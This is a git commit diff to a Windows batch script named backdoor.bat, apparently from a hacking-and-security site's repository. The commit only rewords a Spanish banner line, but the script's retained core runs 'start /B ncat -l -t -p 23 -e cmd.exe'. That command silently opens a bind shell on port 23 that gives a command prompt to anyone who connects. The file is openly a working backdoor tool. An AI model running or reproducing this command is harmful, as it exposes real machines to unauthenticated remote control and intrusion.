c5ce80514090fe6478a12e3a52d267f0a0e1305f
hackingyseguridad <antonio_taboada@hotmail.es>
2020-04-04 23:13:42 +0200

    Update backdoor.bat

--- backdoor.bat
+++ backdoor.bat
@@ -1,4 +1,4 @@
 @echo off
 echo "2020 (c) hackingyseguridad.com" 
-echo "Puerta trasera Telnet para Windows"
+echo "Activa puerta trasera TelnetD para Windows"
 start /B ncat -l -t -p 23 -e cmd.exe 
